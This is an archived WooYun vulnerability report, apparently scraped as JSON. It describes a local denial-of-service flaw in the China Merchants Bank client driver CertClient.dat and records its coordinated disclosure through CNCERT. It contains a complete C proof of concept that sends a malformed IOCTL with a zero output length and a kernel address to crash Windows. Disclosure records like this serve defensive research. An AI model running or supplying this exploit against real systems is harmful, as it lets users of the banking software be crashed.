{"id": 6219, "wybug_id": "wooyun-2013-042047", "wybug_title": "招商银行专业版CertClient.dat本地拒绝服务漏洞", "wybug_corp": "招商银行", "wybug_author": "n0bele", "wybug_date": "2013-11-06 11:15", "wybug_open_date": "2014-02-04 11:15", "wybug_type": "拒绝服务", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["驱动"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-04：\t细节向公众公开  简要描述： 审核人员喜欢看图片就补张图上去 详细说明：  啥都没校验，地址、长度等，写个不稳定的驱动就是祸害客户。OUTLEN为0绕过windows内核校验引发BSODPOC如下：\n#include \"stdafx.h\"#include <windows.h>#include <stdio.h>#include <stdlib.h>#define DEVICE_NAME \"\\\\\\\\.\\\\CMB8100\"#define IOCTL_CODE  0x80102040// #define IOCTL_CODE  0x8010204C//Ke386IoSetAccessProcess关闭int main(int argc, char* argv[]){    HANDLE hDevice    =    INVALID_HANDLE_VALUE;    BOOL   bRet            =    FALSE;    DWORD dwOutput;    //输入缓冲区作为输入，输出缓冲区作为输出    DWORD InputBuffer[64]={0}; \tDWORD outputBuffer[64]={0};       hDevice = CreateFile(DEVICE_NAME,GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);    if(hDevice == NULL) \t{        printf(\"[!] Cannot open a handle to the driver, it is probably not loaded. \");        printf(\"Error : %d\\n\", GetLastError());\t\treturn 0;    }     \tInputBuffer[0]=(DWORD)hDevice; //给一个句柄即可    bRet   =  DeviceIoControl(hDevice, IOCTL_CODE,InputBuffer, 10, (PVOID)(0xffff0000),0, &dwOutput, NULL);    if(FALSE    ==    bRet)   {        printf(\"[!] send ioctl fail!\\r\\n\");        printf(\"Error : %d\\n\", GetLastError());    }   CloseHandle(hDevice);        return 0;}\n   漏洞证明：  传入个0xffff0000送管理员\n\n   修复方案：  校验，合理校验   版权声明：转载请注明来源 n0bele@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-11-10 22:05 厂商回复： CNVD确认并复现所述情况，已经在6日转由CNCERT直接通报给招商银行信息化主管部门。后续情况待反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-06 11:46 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  1    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}